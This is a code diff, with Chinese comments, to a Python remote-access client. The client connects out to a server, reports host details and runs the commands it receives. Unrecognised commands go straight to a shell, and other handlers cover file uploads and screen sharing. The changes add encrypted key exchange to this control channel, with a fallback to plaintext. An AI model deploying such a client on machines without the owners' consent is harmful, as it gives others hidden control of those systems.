@@ -10,6 +10,7 @@ import threading
 import psutil
 import hashlib
 import uuid
+from client_encryption import create_secure_socket
 
 SERVER_IP = '192.168.55.102'
 SERVER_PORT = 2383
@@ -920,15 +921,20 @@ def handle_stop_hybrid_screen_linux(arg, state):
 def reliable_send(sock, data_dict):
     """将字典可靠地编码为JSON并附加换行符后发送（线程安全）"""
     try:
-        # 使用更快的JSON编码选项
-        json_data = json.dumps(data_dict, separators=(',', ':'), ensure_ascii=False).encode('utf-8') + b'\n'
-        with SEND_LOCK:
-            # 设置TCP_NODELAY以减少延迟
-            try:
-                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            except:
-                pass  # 忽略设置失败
-            sock.sendall(json_data)
+        # 检查是否为加密连接
+        if hasattr(sock, 'send_encrypted'):
+            # 使用加密发送
+            sock.send_encrypted(data_dict)
+        else:
+            # 原始JSON发送
+            json_data = json.dumps(data_dict, separators=(',', ':'), ensure_ascii=False).encode('utf-8') + b'\n'
+            with SEND_LOCK:
+                # 设置TCP_NODELAY以减少延迟
+                try:
+                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                except:
+                    pass  # 忽略设置失败
+                sock.sendall(json_data)
     except socket.error as e:
         print(f"[错误] 发送数据时发生Socket错误: {e}")
         raise
@@ -1188,13 +1194,28 @@ def main_loop(server_ip, server_port, connection_code):
     state = {'cwd': os.getcwd(), 'socket': None}
     while True:
         client_socket = None
+        secure_conn = None
         try:
             print(f"[调试] 尝试连接服务器 {server_ip}:{server_port}...")
             client_socket = socket.socket()
             client_socket.connect((server_ip, server_port))
             print(f"[+] 已连接到服务器 {server_ip}:{server_port}")
+            
+            # 尝试创建安全连接并进行密钥交换
+            try:
+                print("[调试] 尝试建立加密连接...")
+                secure_conn = create_secure_socket(client_socket)
+                if secure_conn.perform_key_exchange():
+                    print("[+] 密钥交换成功，使用加密通信")
+                    state['socket'] = secure_conn
+                else:
+                    print("[警告] 密钥交换失败，回退到明文通信")
+                    state['socket'] = client_socket
+            except Exception as e:
+                print(f"[警告] 建立加密连接失败: {e}，回退到明文通信")
+                state['socket'] = client_socket
+            
             state['cwd'] = os.getcwd()
-            state['socket'] = client_socket
 
             os_info = f"{platform.system()} {platform.release()}"
             
@@ -1216,7 +1237,7 @@ def main_loop(server_ip, server_port, connection_code):
                     "hostname": hostname,
                     "connection_code": connection_code  # 添加连接码到握手信息
                 }
-                reliable_send(client_socket, connection_info)
+                reliable_send(state['socket'], connection_info)
                 print(f"[调试] 已发送连接信息，包含连接码")
             except Exception as e:
                 print(f"[错误] 发送初始连接信息失败: {e}")
@@ -1228,15 +1249,49 @@ def main_loop(server_ip, server_port, connection_code):
             
             while not handshake_completed and time.time() < handshake_timeout:
                 try:
-                    part = client_socket.recv(4096)
-                    if not part:
-                        print("[调试] 服务器关闭了连接。")
-                        break
-                    buffer += part
+                    # 根据连接类型接收数据
+                    if secure_conn and hasattr(secure_conn, 'receive_encrypted'):
+                        try:
+                            response = secure_conn.receive_encrypted()
+                            if response is None:
+                                print("[调试] 服务器关闭了连接。")
+                                break
+                        except Exception as e:
+                            print(f"[错误] 加密接收握手响应失败: {e}")
+                            # 回退到原始接收方式
+                            part = client_socket.recv(4096)
+                            if not part:
+                                print("[调试] 服务器关闭了连接。")
+                                break
+                            buffer += part
+                            continue
+                    else:
+                        part = client_socket.recv(4096)
+                        if not part:
+                            print("[调试] 服务器关闭了连接。")
+                            break
+                        buffer += part
+                        continue
                 except socket.error as e:
                     print(f"[错误] 接收握手响应时发生Socket错误: {e}")
                     break
 
+                # 处理加密接收的响应
+                if secure_conn and hasattr(secure_conn, 'receive_encrypted') and response:
+                    # 处理握手确认
+                    if response.get('type') == 'hello_ack':
+                        if response.get('ok'):
+                            mode = response.get('mode', 'unknown')
+                            print(f"[+] 握手成功！模式: {mode}")
+                            handshake_completed = True
+                            break
+                        else:
+                            error = response.get('error', 'unknown_error')
+                            print(f"[错误] 握手失败: {error}")
+                            return  # 退出主循环，不重连
+                    continue
+
+                # 处理原始接收的响应
                 while b'\n' in buffer:
                     message, buffer = buffer.split(b'\n', 1)
                     try:
@@ -1268,7 +1323,7 @@ def main_loop(server_ip, server_port, connection_code):
             stop_status_thread = threading.Event()
             status_thread = threading.Thread(
                 target=send_status_updates,
-                args=(client_socket, stop_status_thread),
+                args=(state['socket'], stop_status_thread),
                 daemon=True
             )
             status_thread.start()
@@ -1276,62 +1331,66 @@ def main_loop(server_ip, server_port, connection_code):
             while True:
                 try:
                     print("[调试] 等待接收数据...")
-                    part = client_socket.recv(4096)
-                    if not part:
-                        print("[调试] 服务器关闭了连接。")
-                        break
-                    print(f"[调试] 接收到数据: {part}")
-                    buffer += part
+                    # 根据连接类型接收数据
+                    if secure_conn and hasattr(secure_conn, 'receive_encrypted'):
+                        try:
+                            cmd_data = secure_conn.receive_encrypted()
+                            if cmd_data is None:
+                                print("[调试] 服务器关闭了连接。")
+                                break
+                            print(f"[调试] 解析的命令数据: {cmd_data}")
+                        except Exception as e:
+                            print(f"[错误] 加密接收数据失败: {e}")
+                            # 回退到原始接收方式
+                            part = client_socket.recv(4096)
+                            if not part:
+                                print("[调试] 服务器关闭了连接。")
+                                break
+                            print(f"[调试] 接收到数据: {part}")
+                            buffer += part
+                            
+                            # 处理缓冲区中的消息
+                            while b'\n' in buffer:
+                                message, buffer = buffer.split(b'\n', 1)
+                                print(f"[调试] 处理消息: {message}")
+                                try:
+                                    cmd_data = json.loads(message.decode('utf-8'))
+                                    print(f"[调试] 解析的命令数据: {cmd_data}")
+                                    # 处理命令
+                                    _process_command(cmd_data, state)
+                                except (json.JSONDecodeError, UnicodeDecodeError) as e:
+                                    print(f"[错误] 解析收到的消息失败: {e}")
+                                    continue
+                            continue
+                    else:
+                        part = client_socket.recv(4096)
+                        if not part:
+                            print("[调试] 服务器关闭了连接。")
+                            break
+                        print(f"[调试] 接收到数据: {part}")
+                        buffer += part
+                        
+                        # 处理缓冲区中的消息
+                        while b'\n' in buffer:
+                            message, buffer = buffer.split(b'\n', 1)
+                            print(f"[调试] 处理消息: {message}")
+                            try:
+                                cmd_data = json.loads(message.decode('utf-8'))
+                                print(f"[调试] 解析的命令数据: {cmd_data}")
+                                # 处理命令
+                                _process_command(cmd_data, state)
+                            except (json.JSONDecodeError, UnicodeDecodeError) as e:
+                                print(f"[错误] 解析收到的消息失败: {e}")
+                                continue
+                        continue
+                        
                 except socket.error as e:
                     print(f"[错误] 接收数据时发生Socket错误: {e}")
                     break
 
-                while b'\n' in buffer:
-                    message, buffer = buffer.split(b'\n', 1)
-                    print(f"[调试] 处理消息: {message}")
-                    try:
-                        cmd_data = json.loads(message.decode('utf-8'))
-                        print(f"[调试] 解析的命令数据: {cmd_data}")
-                    except (json.JSONDecodeError, UnicodeDecodeError) as e:
-                        print(f"[错误] 解析收到的消息失败: {e}")
-                        continue
-
-                    action = cmd_data.get("action")
-                    if not action:
-                        try:
-                            reliable_send(client_socket, {"output": "错误: 命令缺少 'action' 字段"})
-                        except:
-                            pass
-                        continue
-
-                    print(f"[调试] 执行命令: {action}")
-                    try:
-                        handler = COMMAND_HANDLERS.get(action)
-                        if handler:
-                            if action == "upload_file_chunk":
-                                result = handler(cmd_data, state)
-                            else:
-                                arg = cmd_data.get("arg", "")
-                                result = handler(arg, state)
-                        else:
-                            result = handle_exec(
-                                action + (" " + cmd_data.get("arg", "") if cmd_data.get("arg") else ""), state)
-
-                        print(f"[调试] 命令执行结果: {result}")
-                        if isinstance(result, dict):
-                            reliable_send(client_socket, result)
-                        else:
-                            reliable_send(client_socket, {"output": str(result)})
-                        print("[调试] 结果已发送回服务器")
-                    except socket.error as e:
-                        print(f"[错误] 发送响应时Socket错误: {e}")
-                        break
-                    except Exception as e_proc:
-                        print(f"[错误] 处理命令时发生错误: {e_proc}")
-                        try:
-                            reliable_send(client_socket, {"output": f"处理命令时发生错误: {e_proc}"})
-                        except:
-                            break
+                # 处理加密接收的命令
+                if secure_conn and hasattr(secure_conn, 'receive_encrypted') and cmd_data:
+                    _process_command(cmd_data, state)
 
         except socket.error as e_sock:
             print(f"[错误] 客户端 Socket 异常: {e_sock}")
@@ -1372,6 +1431,46 @@ def main_loop(server_ip, server_port, connection_code):
         buffer = b''
         print("[调试] 5秒后尝试重新连接...")
         time.sleep(5)
+
+
+def _process_command(cmd_data, state):
+    """处理接收到的命令"""
+    action = cmd_data.get("action")
+    if not action:
+        try:
+            reliable_send(state['socket'], {"output": "错误: 命令缺少 'action' 字段"})
+        except:
+            pass
+        return
+
+    print(f"[调试] 执行命令: {action}")
+    try:
+        handler = COMMAND_HANDLERS.get(action)
+        if handler:
+            if action == "upload_file_chunk":
+                result = handler(cmd_data, state)
+            else:
+                arg = cmd_data.get("arg", "")
+                result = handler(arg, state)
+        else:
+            result = handle_exec(
+                action + (" " + cmd_data.get("arg", "") if cmd_data.get("arg") else ""), state)
+
+        print(f"[调试] 命令执行结果: {result}")
+        if isinstance(result, dict):
+            reliable_send(state['socket'], result)
+        else:
+            reliable_send(state['socket'], {"output": str(result)})
+        print("[调试] 结果已发送回服务器")
+    except socket.error as e:
+        print(f"[错误] 发送响应时Socket错误: {e}")
+        raise
+    except Exception as e_proc:
+        print(f"[错误] 处理命令时发生错误: {e_proc}")
+        try:
+            reliable_send(state['socket'], {"output": f"处理命令时发生错误: {e_proc}"})
+        except:
+            raise
 
 def main():
     """简单的命令行启动函数"""
